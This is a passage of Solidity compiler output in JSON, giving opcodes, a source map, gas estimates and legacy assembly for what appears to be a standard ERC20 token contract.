PUSH2 0x6EA JUMP JUMPDEST SWAP5 PUSH1 0x20 SWAP4 SWAP1 SWAP4 ADD CALLDATALOAD SWAP4 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x745 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x74E DUP5 PUSH2 0x6EA JUMP JUMPDEST SWAP3 POP PUSH2 0x75C PUSH1 0x20 DUP6 ADD PUSH2 0x6EA JUMP JUMPDEST SWAP2 POP PUSH1 0x40 DUP5 ADD CALLDATALOAD SWAP1 POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x77E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x787 DUP3 PUSH2 0x6EA JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x7A1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x7AA DUP4 PUSH2 0x6EA JUMP JUMPDEST SWAP2 POP PUSH2 0x7B8 PUSH1 0x20 DUP5 ADD PUSH2 0x6EA JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH2 0x7D5 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x7F5 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP1 DUP3 ADD DUP1 DUP3 GT ISZERO PUSH2 0x246 JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xD4 LOG0 EXTCODEHASH CHAINID DUP2 PUSH14 0x8ABC72FD918A2322F2A3C568A203 XOR 0xB1 PUSH30 0xFD2264E68A262D9D2764736F6C6343000812003300000000000000000000 ",
							"sourceMap": "1532:11312:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2158:98;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;4444:197;;;;;;:::i;:::-;;:::i;:::-;;;1169:14:5;;1162:22;1144:41;;1132:2;1117:18;4444:197:0;1004:187:5;3255:106:0;3342:12;;3255:106;;;1342:25:5;;;1330:2;1315:18;3255:106:0;1196:177:5;5203:256:0;;;;;;:::i;:::-;;:::i;3104:91::-;;;3186:2;1853:36:5;;1841:2;1826:18;3104:91:0;1711:184:5;5854:234:0;;;;;;:::i;:::-;;:::i;3419:125::-;;;;;;:::i;:::-;-1:-1:-1;;;;;3519:18:0;3493:7;3519:18;;;;;;;;;;;;3419:125;2369:102;;;:::i;6575:427::-;;;;;;:::i;:::-;;:::i;3740:189::-;;;;;;:::i;:::-;;:::i;3987:149::-;;;;;;:::i;:::-;;:::i;2158:98::-;2212:13;2244:5;2237:12;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2158:98;:::o;4444:197::-;4527:4;719:10:3;4581:32:0;719:10:3;4597:7:0;4606:6;4581:8;:32::i;:::-;4630:4;4623:11;;;4444:197;;;;;:::o;5203:256::-;5300:4;719:10:3;5356:38:0;5372:4;719:10:3;5387:6:0;5356:15;:38::i;:::-;5404:27;5414:4;5420:2;5424:6;5404:9;:27::i;:::-;-1:-1:-1;5448:4:0;;5203:256;-1:-1:-1;;;;5203:256:0:o;5854:234::-;5942:4;719:10:3;5996:64:0;719:10:3;6012:7:0;6049:10;6021:25;719:10:3;6012:7:0;6021:9;:25::i;:::-;:38;;;;:::i;:::-;5996:8;:64::i;2369:102::-;2425:13;2457:7;2450:14;;;;;:::i;6575:427::-;6668:4;719:10:3;6668:4:0;6749:25;719:10:3;6766:7:0;6749:9;:25::i;:::-;6722:52;;6812:15;6792:16;:35;;6784:85;;;;-1:-1:-1;;;6784:85:0;;3170:2:5;6784:85:0;;;3152:21:5;3209:2;3189:18;;;3182:30;3248:34;3228:18;;;3221:62;-1:-1:-1;;;3299:18:5;;;3292:35;3344:19;;6784:85:0;;;;;;;;;6903:60;6912:5;6919:7;6947:15;6928:16;:34;6903:8;:60::i;3740:189::-;3819:4;719:10:3;3873:28:0;719:10:3;3890:2:0;3894:6;3873:9;:28::i;3987:149::-;-1:-1:-1;;;;;4102:18:0;;;4076:7;4102:18;;;:11;:18;;;;;;;;:27;;;;;;;;;;;;;3987:149::o;10457:340::-;-1:-1:-1;;;;;10558:19:0;;10550:68;;;;-1:-1:-1;;;10550:68:0;;3576:2:5;10550:68:0;;;3558:21:5;3615:2;3595:18;;;3588:30;3654:34;3634:18;;;3627:62;-1:-1:-1;;;3705:18:5;;;3698:34;3749:19;;10550:68:0;3374:400:5;10550:68:0;-1:-1:-1;;;;;10636:21:0;;10628:68;;;;-1:-1:-1;;;10628:68:0;;3981:2:5;10628:68:0;;;3963:21:5;4020:2;4000:18;;;3993:30;4059:34;4039:18;;;4032:62;-1:-1:-1;;;4110:18:5;;;4103:32;4152:19;;10628:68:0;3779:398:5;10628:68:0;-1:-1:-1;;;;;10707:18:0;;;;;;;:11;:18;;;;;;;;:27;;;;;;;;;;;;;:36;;;10758:32;;1342:25:5;;;10758:32:0;;1315:18:5;10758:32:0;;;;;;;10457:340;;;:::o;11078:411::-;11178:24;11205:25;11215:5;11222:7;11205:9;:25::i;:::-;11178:52;;-1:-1:-1;;11244:16:0;:37;11240:243;;11325:6;11305:16;:26;;11297:68;;;;-1:-1:-1;;;11297:68:0;;4384:2:5;11297:68:0;;;4366:21:5;4423:2;4403:18;;;4396:30;4462:31;4442:18;;;4435:59;4511:18;;11297:68:0;4182:353:5;11297:68:0;11407:51;11416:5;11423:7;11451:6;11432:16;:25;11407:8;:51::i;:::-;11168:321;11078:411;;;:::o;7456:788::-;-1:-1:-1;;;;;7552:18:0;;7544:68;;;;-1:-1:-1;;;7544:68:0;;4742:2:5;7544:68:0;;;4724:21:5;4781:2;4761:18;;;4754:30;4820:34;4800:18;;;4793:62;-1:-1:-1;;;4871:18:5;;;4864:35;4916:19;;7544:68:0;4540:401:5;7544:68:0;-1:-1:-1;;;;;7630:16:0;;7622:64;;;;-1:-1:-1;;;7622:64:0;;5148:2:5;7622:64:0;;;5130:21:5;5187:2;5167:18;;;5160:30;5226:34;5206:18;;;5199:62;-1:-1:-1;;;5277:18:5;;;5270:33;5320:19;;7622:64:0;4946:399:5;7622:64:0;-1:-1:-1;;;;;7768:15:0;;7746:19;7768:15;;;;;;;;;;;7801:21;;;;7793:72;;;;-1:-1:-1;;;7793:72:0;;5552:2:5;7793:72:0;;;5534:21:5;5591:2;5571:18;;;5564:30;5630:34;5610:18;;;5603:62;-1:-1:-1;;;5681:18:5;;;5674:36;5727:19;;7793:72:0;5350:402:5;7793:72:0;-1:-1:-1;;;;;7899:15:0;;;:9;:15;;;;;;;;;;;7917:20;;;7899:38;;8114:13;;;;;;;;;;:23;;;;;;8163:26;;1342:25:5;;;8114:13:0;;8163:26;;1315:18:5;8163:26:0;;;;;;;8200:37;12073:91;14:548:5;126:4;155:2;184;173:9;166:21;216:6;210:13;259:6;254:2;243:9;239:18;232:34;284:1;294:140;308:6;305:1;302:13;294:140;;;403:14;;;399:23;;393:30;369:17;;;388:2;365:26;358:66;323:10;;294:140;;;298:3;483:1;478:2;469:6;458:9;454:22;450:31;443:42;553:2;546;542:7;537:2;529:6;525:15;521:29;510:9;506:45;502:54;494:62;;;;14:548;;;;:::o;567:173::-;635:20;;-1:-1:-1;;;;;684:31:5;;674:42;;664:70;;730:1;727;720:12;664:70;567:173;;;:::o;745:254::-;813:6;821;874:2;862:9;853:7;849:23;845:32;842:52;;;890:1;887;880:12;842:52;913:29;932:9;913:29;:::i;:::-;903:39;989:2;974:18;;;;961:32;;-1:-1:-1;;;745:254:5:o;1378:328::-;1455:6;1463;1471;1524:2;1512:9;1503:7;1499:23;1495:32;1492:52;;;1540:1;1537;1530:12;1492:52;1563:29;1582:9;1563:29;:::i;:::-;1553:39;;1611:38;1645:2;1634:9;1630:18;1611:38;:::i;:::-;1601:48;;1696:2;1685:9;1681:18;1668:32;1658:42;;1378:328;;;;;:::o;1900:186::-;1959:6;2012:2;2000:9;1991:7;1987:23;1983:32;1980:52;;;2028:1;2025;2018:12;1980:52;2051:29;2070:9;2051:29;:::i;:::-;2041:39;1900:186;-1:-1:-1;;;1900:186:5:o;2091:260::-;2159:6;2167;2220:2;2208:9;2199:7;2195:23;2191:32;2188:52;;;2236:1;2233;2226:12;2188:52;2259:29;2278:9;2259:29;:::i;:::-;2249:39;;2307:38;2341:2;2330:9;2326:18;2307:38;:::i;:::-;2297:48;;2091:260;;;;;:::o;2356:380::-;2435:1;2431:12;;;;2478;;;2499:61;;2553:4;2545:6;2541:17;2531:27;;2499:61;2606:2;2598:6;2595:14;2575:18;2572:38;2569:161;;2652:10;2647:3;2643:20;2640:1;2633:31;2687:4;2684:1;2677:15;2715:4;2712:1;2705:15;2569:161;;2356:380;;;:::o;2741:222::-;2806:9;;;2827:10;;;2824:133;;;2879:10;2874:3;2870:20;2867:1;2860:31;2914:4;2911:1;2904:15;2942:4;2939:1;2932:15"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "426000",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"allowance(address,address)": "infinite",
								"approve(address,uint256)": "24628",
								"balanceOf(address)": "2562",
								"decimals()": "266",
								"decreaseAllowance(address,uint256)": "27016",
								"increaseAllowance(address,uint256)": "infinite",
								"name()": "infinite",
								"symbol()": "infinite",
								"totalSupply()": "2326",
								"transfer(address,uint256)": "51138",
								"transferFrom(address,address,uint256)": "infinite"
							},
							"internal": {
								"_afterTokenTransfer(address,address,uint256)": "infinite",
								"_approve(address,address,uint256)": "infinite",
								"_beforeTokenTransfer(address,address,uint256)": "infinite",
								"_burn(address,uint256)": "infinite",
								"_mint(address,uint256)": "infinite",
								"_spendAllowance(address,address,uint256)": "infinite",
								"_transfer(address,address,uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 1532,
									"end": 12844,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 1532,
									"end": 12844,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 1532,
									"end": 12844,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 1980,
									"end": 2093,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 2046,
									"end": 2051,
									"name": "PUSH",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 2046,
									"end": 2059,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 2054,
									"end": 2059,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 2046,
									"end": 2051,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 2046,
									"end": 2059,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "7"
								},
								{
									"begin": 2046,
									"end": 2059,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 2046,
									"end": 2059,
									"name": "tag",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 2046,
									"end": 2059,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 2069,
									"end": 2076,
									"name": "PUSH",
									"source": 0,
									"value": "4"
								},
								{
									"begin": 2069,
									"end": 2086,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "8"
								},
								{
									"begin": 2079,
									"end": 2086,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 2069,
									"end": 2076,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 2069,
									"end": 2086,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "7"
								},
								{
									"begin": 2069,
									"end": 2086,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 2069,
									"end": 2086,
									"name": "tag",
									"source": 0,
									"value": "8"
								},
								{
									"begin": 2069,
									"end": 2086,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 2069,
									"end": 2086,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1980,
									"end": 2093,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1532,
									"end": 12844,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "16"
								},
								{
									"begin": 1532,
									"end": 12844,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 14,
									"end": 141,
									"name": "tag",
									"source": 5,
									"value": "10"
								},
								{
									"begin": 14,
									"end": 141,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 75,
									"end": 85,
									"name": "PUSH",
									"source": 5,
									"value": "4E487B71"
								},
								{
									"begin": 70,
									"end": 73,
									"name": "PUSH",
									"source": 5,
									"value": "E0"
								},
								{
									"begin": 66,
									"end": 86,
									"name": "SHL",
									"source": 5
								},
								{
									"begin": 63,
									"end": 64,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 56,
									"end": 87,
									"name": "MSTORE",
									"source": 5
								},
								{
									"begin": 106,
									"end": 110,
									"name": "PUSH",
									"source": 5,
									"value": "41"
								},
								{
									"begin": 103,
									"end": 104,
									"name": "PUSH",
									"source": 5,
									"value": "4"
								},
								{
									"begin": 96,
									"end": 111,
									"name": "MSTORE",
									"source": 5
								},
								{
									"begin": 130,
									"end": 134,
									"name": "PUSH",
									"source": 5,
									"value": "24"
								},
								{
									"begin": 127,
									"end": 128,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 120,
									"end": 135,
									"name": "REVERT",
									"source": 5
								},
								{
									"begin": 146,
									"end": 986,
									"name": "tag",
									"source": 5,
									"value": "11"
								},
								{
									"begin": 146,
									"end": 986,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 200,
									"end": 205,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 253,
									"end": 256,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 246,
									"end": 250,
									"name": "PUSH",
									"source": 5,
									"value": "1F"
								},
								{
									"begin": 238,
									"end": 244,
									"name": "DUP4",
									"source": 5
								},
								{
									"begin": 234,
									"end": 251,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 230,
									"end": 257,
									"name": "SLT",
									"source": 5
								},
								{
									"begin": 220,
									"end": 275,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "19"
								},
								{
									"begin": 220,
									"end": 275,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 271,
									"end": 272,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 268,
									"end": 269,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 261,
									"end": 273,
									"name": "REVERT",
									"source": 5
								},
								{
									"begin": 220,
									"end": 275,
									"name": "tag",
									"source": 5,
									"value": "19"
								},
								{
									"begin": 220,
									"end": 275,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 294,
									"end": 307,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 294,
									"end": 307,
									"name": "MLOAD",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "40"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": 356,
									"end": 366,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 356,
									"end": 366,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 356,
									"end": 366,
									"name": "GT",
									"source": 5
								},
								{
									"begin": 353,
									"end": 389,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 353,
									"end": 389,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "21"
								},
								{
									"begin": 353,
									"end": 389,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 369,
									"end": 387,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "21"
								},
								{
									"begin": 369,
									"end": 387,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "10"
								},
								{
									"begin": 369,
									"end": 387,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 369,
									"end": 387,
									"name": "tag",
									"source": 5,
									"value": "21"
								},
								{
									"begin": 369,
									"end": 387,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 444,
									"end": 446,
									"name": "PUSH",
									"source": 5,
									"value": "40"
								},
								{
									"begin": 438,
									"end": 447,
									"name": "MLOAD",
									"source": 5
								},
								{
									"begin": 412,
									"end": 414,
									"name": "PUSH",
									"source": 5,
									"value": "1F"
								},
								{
									"begin": 498,
									"end": 511,
									"name": "DUP4",
									"source": 5
								},
								{
									"begin": 498,
									"end": 511,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1F"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT",
									"source": -1
								},
								{
									"begin": 494,
									"end": 516,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 494,
									"end": 516,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 494,
									"end": 516,
									"name": "AND",
									"source": 5
								},
								{
									"begin": 518,
									"end": 520,
									"name": "PUSH",
									"source": 5,
									"value": "3F"
								},
								{
									"begin": 490,
									"end": 521,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 486,
									"end": 526,
									"name": "AND",
									"source": 5
								},
								{
									"begin": 474,
									"end": 527,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 474,
									"end": 527,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 474,
									"end": 527,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 542,
									"end": 560,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 542,
									"end": 560,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 542,
									"end": 560,
									"name": "GT",
									"source": 5
								},
								{
									"begin": 562,
									"end": 584,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 562,
									"end": 584,
									"name": "DUP4",
									"source": 5
								},
								{
									"begin": 562,
									"end": 584,
									"name": "LT",
									"source": 5
								},
								{
									"begin": 539,
									"end": 585,
									"name": "OR",
									"source": 5
								},
								{
									"begin": 536,
									"end": 608,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 536,
									"end": 608,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "23"
								},
								{
									"begin": 536,
									"end": 608,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 588,
									"end": 606,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "23"
								},
								{
									"begin": 588,
									"end": 606,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "10"
								},
								{
									"begin": 588,
									"end": 606,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 588,
									"end": 606,
									"name": "tag",
									"source": 5,
									"value": "23"
								},
								{
									"begin": 588,
									"end": 606,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 628,
									"end": 638,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 624,
									"end": 626,
									"name": "PUSH",
									"source": 5,
									"value": "40"
								},
								{
									"begin": 617,
									"end": 639,
									"name": "MSTORE",
									"source": 5
								},
								{
									"begin": 663,
									"end": 665,
									"name": "DUP4",
									"source": 5
								},
								{
									"begin": 655,
									"end": 661,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 648,
									"end": 666,
									"name": "MSTORE",
									"source": 5
								},
								{
									"begin": 685,
									"end": 689,
									"name": "PUSH",
									"source": 5,
									"value": "20"
								},
								{
									"begin": 675,
									"end": 689,
									"name": "SWAP3",
									"source": 5
								},
								{
									"begin": 675,
									"end": 689,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 730,
									"end": 733,
									"name": "DUP7",
									"source": 5
								},
								{
									"begin": 725,
									"end": 727,
									"name": "DUP4",
									"source": 5
								},
								{
									"begin": 720,
									"end": 722,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 712,
									"end": 718,
									"name": "DUP9",
									"source": 5
								},
								{
									"begin": 708,
									"end": 723,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 704,
									"end": 728,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 701,
									"end": 734,
									"name": "GT",
									"source": 5
								},
								{
									"begin": 698,
									"end": 751,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 698,
									"end": 751,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "24"
								},
								{
									"begin": 698,
									"end": 751,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 747,
									"end": 748,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 744,
									"end": 745,
									"name": "DUP1",
									"source": 5
								},
								{
									"begin": 737,
									"end": 749,
									"name": "REVERT",
									"source": 5
								},
								{
									"begin": 698,
									"end": 751,
									"name": "tag",
									"source": 5,
									"value": "24"
								},
								{
									"begin": 698,
									"end": 751,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 769,
									"end": 770,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 760,
									"end": 770,
									"name": "SWAP2",
									"source": 5
								},
								{
									"begin": 760,
									"end": 770,
									"name": "POP",
									"source": 5
								},
								{
									"begin": 779,
									"end": 912,
									"name": "tag",
									"source": 5,
									"value": "25"
								},
								{
									"begin": 779,
									"end": 912,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 793,
									"end": 795,
									"name": "DUP4",
									"source": 5
								},
								{
									"begin": 790,
									"end": 791,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 787,
									"end": 796,
									"name": "LT",
									"source": 5
								},
								{
									"begin": 779,
									"end": 912,
									"name": "ISZERO",
									"source": 5
								},
								{
									"begin": 779,
									"end": 912,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "27"
								},
								{
									"begin": 779,
									"end": 912,
									"name": "JUMPI",
									"source": 5
								},
								{
									"begin": 881,
									"end": 895,
									"name": "DUP6",
									"source": 5
								},
								{
									"begin": 881,
									"end": 895,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 881,
									"end": 895,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 877,
									"end": 900,
									"name": "DUP4",
									"source": 5
								},
								{
									"begin": 877,
									"end": 900,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 871,
									"end": 901,
									"name": "MLOAD",
									"source": 5
								},
								{
									"begin": 850,
									"end": 864,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 850,
									"end": 864,
									"name": "DUP4",
									"source": 5
								},
								{
									"begin": 850,
									"end": 864,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 846,
									"end": 869,
									"name": "DUP5",
									"source": 5
								},
								{
									"begin": 846,
									"end": 869,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 839,
									"end": 902,
									"name": "MSTORE",
									"source": 5
								},
								{
									"begin": 804,
									"end": 814,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 804,
									"end": 814,
									"name": "DUP3",
									"source": 5
								},
								{
									"begin": 804,
									"end": 814,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 804,
									"end": 814,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 779,
									"end": 912,
									"name": "PUSH [tag]",
									"source": 5,
									"value": "25"
								},
								{
									"begin": 779,
									"end": 912,
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 779,
									"end": 912,
									"name": "tag",
									"source": 5,
									"value": "27"
								},
								{
									"begin": 779,
									"end": 912,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 954,
									"end": 955,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 932,
									"end": 947,
									"name": "SWAP4",
									"source": 5
								},
								{
									"begin": 932,
									"end": 947,
									"name": "DUP2",
									"source": 5
								},
								{
									"begin": 932,
									"end": 947,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 928,
									"end": 952,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 928,
									"end": 952,
									"name": "SWAP3",
									"source": 5
								},
								{
									"begin": 928,
									"end": 952,
									"name": "ADD",
									"source": 5
								},
								{
									"begin": 921,
									"end": 956,
									"name": "SWAP3",
									"source": 5
								},
								{
									"begin": 921,
									"end": 956,
									"name": "SWAP1",
									"source": 5
								},
								{
									"begin": 921,
									"end": 956,
									"name": "SWAP3",
									"source": 5
								},
								{
									"begin": 921,
									"end": 956,
									"name": "MSTORE",
									"source": 5
								},
								{
									"begin": 936,
									"end": 942,
									"name": "SWAP5",
									"source": 5
								},
								{
									"begin": 146,
									"end": 986,
									"name": "SWAP4",
									"source": 5
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 146,
									"end": 986,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 5
								},
								{
									"begin": 991,
									"end": 1553,
									"name": "tag",
									"source": 5,
									"value": "3"
								},
								{
									"begin": 991,
									"end": 1553,
									"name": "JUMPDEST",
									"source": 5
								},
								{
									"begin": 1090,
									"end": 1096,
									"name": "PUSH",
									"source": 5,
									"value": "0"
								},
								{
									"begin": 1098,
									"end": 1104,
									"name": "DUP1",
									"source": 5
								},
								{
